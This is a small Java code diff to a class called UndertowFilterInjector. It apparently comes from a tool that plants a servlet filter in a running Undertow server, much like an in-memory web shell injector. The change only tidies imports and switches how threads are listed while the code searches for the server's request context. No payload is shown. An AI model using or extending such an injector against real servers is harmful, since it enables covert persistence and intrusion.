@@ -6,10 +6,7 @@ import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.ArrayList;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
+import java.util.*;
 import java.util.zip.GZIPInputStream;
 
 
@@ -48,7 +45,7 @@ public class UndertowFilterInjector {
 
     public List<Object> getContext() {
         List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", null, null);
+        Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             try {
                 Class<?> clazz = thread.getContextClassLoader().loadClass("io.undertow.servlet.handlers.ServletRequestContext");
